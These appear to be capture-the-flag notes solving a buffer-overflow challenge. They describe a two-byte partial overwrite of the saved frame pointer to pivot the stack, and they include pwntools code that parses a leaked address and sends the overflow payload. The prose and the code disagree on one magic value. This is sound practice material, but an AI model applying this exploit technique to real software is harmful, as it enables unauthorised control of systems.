- `checksec`
  ![[bof9_JHT-1.png]]
- decompile:
  ![[bof9_JHT-2.png]]
  ![[bof9_JHT-3.png]]
  - change var to get shell, able to overwrite 2 bytes of saved rbp -> [[stack pivot]]
  - `get_credential()`:
    ![[bof9_JHT-4.png]]
- `main()`:
  ![[bof9_JHT-5.png]]
- look at `main`, it starts cmp from $rbp-0x20, so the idea is to set rbp as addr 0x20 behind 0x13371337 + 0xdeadbeef + 0xcafebeef
- here we have leaked rsp addr in main:
  ![[bof9_JHT-6.png]]
  ![[bof9_JHT-7.png]]
  ![[bof9_JHT-8.png]]
- payload:
  ```python
	p.recvuntil(b'user: ')
	leak = int(p.recvline().strip(), 16)
	log.info(f'Leaked address: {hex(leak)}')
  ```
- find offset from leaked addr to the one 0x20 behind 0x13371337 + 0xdeadbeef + 0xcafebeef
  ![[bof9_JHT-9.png]]
  ![[bof9_JHT-10.png]]
- so 2 bytes need to be overwritten:
  ```python
	leak = leak-0x30
	byte = leak & 0xffff
  ```
  ![[bof9_JHT-11.png]]
- payload:
  ```python
	payload = p64(0x13371337) + p64(0xDEADBEEF) + p64(0xCAFEBABE)
	p.sendafter(b'Username: ', b'A'*32 + p16(byte))
	p.sendafter(b'Password: ', payload.ljust(32, b'B'))
	```